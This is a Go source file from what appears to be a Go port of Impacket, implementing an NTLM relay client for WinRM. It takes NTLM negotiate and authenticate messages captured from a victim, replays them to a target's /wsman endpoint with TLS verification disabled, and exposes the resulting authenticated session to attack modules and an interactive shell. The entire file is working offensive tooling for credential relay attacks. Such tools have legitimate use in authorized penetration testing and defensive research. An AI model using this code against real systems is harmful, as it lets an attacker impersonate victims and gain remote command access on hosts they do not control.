package relay

import (
	"crypto/tls"
	"encoding/base64"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"regexp"
	"strings"

	"gopacket/internal/build"
)

// WinRMRelayClient implements ProtocolClient for relaying NTLM auth to WinRM targets.
// WinRM uses HTTP(S) POST /wsman with SOAP XML bodies and NTLM auth in HTTP headers.
// Matches Impacket's winrmrelayclient.py behavior.
type WinRMRelayClient struct {
	targetAddr    string
	useTLS        bool
	httpClient    *http.Client
	authMethod    string // "NTLM" or "Negotiate"
	authenticated bool
}

// NewWinRMRelayClient creates a new WinRM relay client.
func NewWinRMRelayClient(addr string, useTLS bool) *WinRMRelayClient {
	return &WinRMRelayClient{
		targetAddr: addr,
		useTLS:     useTLS,
	}
}

// InitConnection creates the HTTP client with connection reuse for NTLM handshake.
// Implements ProtocolClient.
func (c *WinRMRelayClient) InitConnection() error {
	transport := &http.Transport{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
		},
		DisableKeepAlives: false,
		// Force single connection reuse for NTLM auth
		MaxIdleConnsPerHost: 1,
		DialContext: (&net.Dialer{
			Timeout: 10 * 1e9, // 10 seconds
		}).DialContext,
	}

	c.httpClient = &http.Client{
		Transport: transport,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	return nil
}

// baseURL returns the scheme://host base URL.
func (c *WinRMRelayClient) baseURL() string {
	scheme := "http"
	if c.useTLS {
		scheme = "https"
	}
	return fmt.Sprintf("%s://%s", scheme, c.targetAddr)
}

// SendNegotiate relays the NTLM Type1 and returns the Type2 challenge from the WinRM target.
// Uses POST /wsman with SOAP content type and dummy XML body (matches Impacket).
// Implements ProtocolClient.
func (c *WinRMRelayClient) SendNegotiate(ntlmType1 []byte) ([]byte, error) {
	url := c.baseURL() + "/wsman"

	// Step 1: Initial POST to check auth method
	req, err := http.NewRequest("POST", url, strings.NewReader("<xml></xml>"))
	if err != nil {
		return nil, fmt.Errorf("create request: %v", err)
	}
	req.Header.Set("Content-Type", "application/soap+xml;charset=UTF-8")

	resp, err := c.httpClient.Do(req)
	if err != nil {
		return nil, fmt.Errorf("initial POST failed: %v", err)
	}
	io.Copy(io.Discard, resp.Body)
	resp.Body.Close()

	if resp.StatusCode != 401 {
		if build.Debug {
			log.Printf("[D] WinRM relay client: status %d (expected 401)", resp.StatusCode)
		}
	}

	// Check WWW-Authenticate headers — prefer NTLM over Negotiate (matches Impacket)
	wwwAuthValues := resp.Header.Values("WWW-Authenticate")
	wwwAuthAll := strings.Join(wwwAuthValues, ", ")
	if strings.Contains(wwwAuthAll, "NTLM") {
		c.authMethod = "NTLM"
	} else if strings.Contains(wwwAuthAll, "Negotiate") {
		c.authMethod = "Negotiate"
	} else {
		c.authMethod = "Negotiate"
		if build.Debug {
			log.Printf("[D] WinRM relay client: no NTLM in WWW-Authenticate (%s), using Negotiate", wwwAuthAll)
		}
	}

	// Step 2: Send Type1 negotiate via POST
	negotiate := base64.StdEncoding.EncodeToString(ntlmType1)
	req2, err := http.NewRequest("POST", url, strings.NewReader("<xml></xml>"))
	if err != nil {
		return nil, fmt.Errorf("create negotiate request: %v", err)
	}
	req2.Header.Set("Content-Type", "application/soap+xml;charset=UTF-8")
	req2.Header.Set("Authorization", fmt.Sprintf("%s %s", c.authMethod, negotiate))

	resp2, err := c.httpClient.Do(req2)
	if err != nil {
		return nil, fmt.Errorf("negotiate POST failed: %v", err)
	}
	io.Copy(io.Discard, resp2.Body)
	resp2.Body.Close()

	// Extract Type2 challenge from WWW-Authenticate header(s)
	challengeHeaders := resp2.Header.Values("WWW-Authenticate")
	if len(challengeHeaders) == 0 {
		return nil, fmt.Errorf("no WWW-Authenticate in challenge response")
	}

	re := regexp.MustCompile(fmt.Sprintf(`%s\s+([a-zA-Z0-9+/]+=*)`, regexp.QuoteMeta(c.authMethod)))
	var matches []string
	for _, h := range challengeHeaders {
		if m := re.FindStringSubmatch(h); len(m) >= 2 {
			matches = m
			break
		}
	}
	if len(matches) < 2 {
		return nil, fmt.Errorf("no NTLM challenge in WWW-Authenticate: %v", challengeHeaders)
	}

	type2, err := base64.StdEncoding.DecodeString(matches[1])
	if err != nil {
		return nil, fmt.Errorf("decode challenge: %v", err)
	}

	if build.Debug {
		log.Printf("[D] WinRM relay client: got Type2 challenge (%d bytes) via %s", len(type2), c.authMethod)
	}

	return type2, nil
}

// SendAuth relays the NTLM Type3 authenticate to the WinRM target.
// Unwraps SPNEGO if present (matching Impacket behavior).
// Implements ProtocolClient.
func (c *WinRMRelayClient) SendAuth(ntlmType3 []byte) error {
	// Unwrap SPNEGO if needed (SMB server wraps Type3 in SPNEGO NegTokenResp)
	token := unwrapSPNEGOType3(ntlmType3)

	url := c.baseURL() + "/wsman"
	auth := base64.StdEncoding.EncodeToString(token)

	req, err := http.NewRequest("POST", url, strings.NewReader("<xml></xml>"))
	if err != nil {
		return fmt.Errorf("create auth request: %v", err)
	}
	req.Header.Set("Content-Type", "application/soap+xml;charset=UTF-8")
	req.Header.Set("Authorization", fmt.Sprintf("%s %s", c.authMethod, auth))

	resp, err := c.httpClient.Do(req)
	if err != nil {
		return fmt.Errorf("auth POST failed: %v", err)
	}
	io.Copy(io.Discard, resp.Body)
	resp.Body.Close()

	if resp.StatusCode == 401 {
		return fmt.Errorf("authentication failed (401)")
	}

	// Impacket treats any non-401 as success
	if build.Debug {
		log.Printf("[D] WinRM relay client: auth response status=%d, treating as success", resp.StatusCode)
	}
	c.authenticated = true

	return nil
}

// GetSession returns this client for use by attack modules.
// Implements ProtocolClient.
func (c *WinRMRelayClient) GetSession() interface{} {
	return c
}

// KeepAlive sends a WS-Man shell creation request as a heartbeat (matches Impacket).
// Implements ProtocolClient.
func (c *WinRMRelayClient) KeepAlive() error {
	_, err := c.DoWinRMRequest(keepAliveXML(c.baseURL() + "/wsman"))
	return err
}

// Kill terminates the connection.
// Implements ProtocolClient.
func (c *WinRMRelayClient) Kill() {
	if c.httpClient != nil {
		c.httpClient.CloseIdleConnections()
	}
}

// IsAdmin returns false — WinRM access itself implies elevated privileges but
// there's no programmatic way to check via relay.
// Implements ProtocolClient.
func (c *WinRMRelayClient) IsAdmin() bool {
	return false
}

// DoWinRMRequest sends a SOAP request to /wsman and returns the response body.
// Used by the attack module and interactive shell for all WS-Man operations.
func (c *WinRMRelayClient) DoWinRMRequest(body string) (string, error) {
	url := c.baseURL() + "/wsman"

	req, err := http.NewRequest("POST", url, strings.NewReader(body))
	if err != nil {
		return "", fmt.Errorf("create request: %v", err)
	}
	req.Header.Set("Content-Type", "application/soap+xml;charset=UTF-8")

	resp, err := c.httpClient.Do(req)
	if err != nil {
		return "", fmt.Errorf("POST /wsman failed: %v", err)
	}

	respBody, err := io.ReadAll(resp.Body)
	resp.Body.Close()
	if err != nil {
		return "", fmt.Errorf("read response: %v", err)
	}

	if resp.StatusCode == 401 {
		return "", fmt.Errorf("session expired (401)")
	}

	return string(respBody), nil
}
